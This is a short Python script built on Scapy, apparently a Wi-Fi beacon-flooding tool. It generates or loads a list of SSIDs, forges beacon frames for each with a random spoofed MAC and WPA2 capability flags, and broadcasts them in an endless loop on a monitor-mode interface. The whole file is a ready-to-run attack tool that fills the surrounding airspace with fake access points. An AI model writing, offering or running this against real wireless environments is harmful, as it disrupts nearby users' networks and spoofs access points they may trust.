#!/usr/bin/env python

from scapy.all import *
import sys
import argparse
import random


SSID_LENGTH = 12
ssids = []

# Function to generate a random SSID name
def generate_ssid():
    ssid_alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'

    random_string = ''.join(random.choice(ssid_alphabet) for i in range(SSID_LENGTH))

    return "WIFI_" + random_string

def main():
    # Argument parsing
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--list")
    parser.add_argument("-i", "--interface")
    args = parser.parse_args()


    # Get inteface name from args
    if args.interface == None:
        print("[WARN] No interface specified, defaulting to wlan0mon")
        interface = "wlan0mon"
    else:
        interface = args.interface

    # If no list has been supplied, generate SSID randomly
    if args.list == None:
        print("No SSID name list specified. Using generated SSIDs")
        amount = 0

        while (amount == 0 or amount > 100):
            amount = int(input("Enter number of SSID to generate:"))

        for i in range(0,amount):
            ssids.append(generate_ssid())
    # If a list has been provided, read file into array then close it
    else:
        file = open(args.list, 'r')

        for line in file.readlines():
            ssids.append(format(line.strip()))

        file.close()


    print("Spoofing beacons for all of the following SSIDs:")
    print(ssids)

    # For each ssid inside the ssids array, build a packet
    # Source: http://www.cs.toronto.edu/~arnold/427/18s/427_18S/indepth/scapy_wifi/scapy_tut.html
    packets = []
    for ssid in ssids:
        src = RandMAC()
        packets.append(RadioTap()
                   / Dot11(type=0, subtype=8, # Management beacon frame
                           addr1='ff:ff:ff:ff:ff:ff', # Broadcast address
                           addr2=src,
                           addr3=src)
                   / Dot11Beacon(cap='ESS+privacy')
                   / Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
                   / Dot11Elt(ID='RSNinfo', info=(
                    '\x01\x00'
                    '\x00\x0f\xac\x02'
                    '\x02\x00'
                    '\x00\x0f\xac\x04'
                    '\x00\x0f\xac\x02'
                    '\x01\x00'
                    '\x00\x0f\xac\x02'
                    '\x00\x00')))
    # Send all packets in a loop
    sendp(packets, iface=interface, inter=0.1, loop=1)


        

if __name__ == "__main__":
    main()
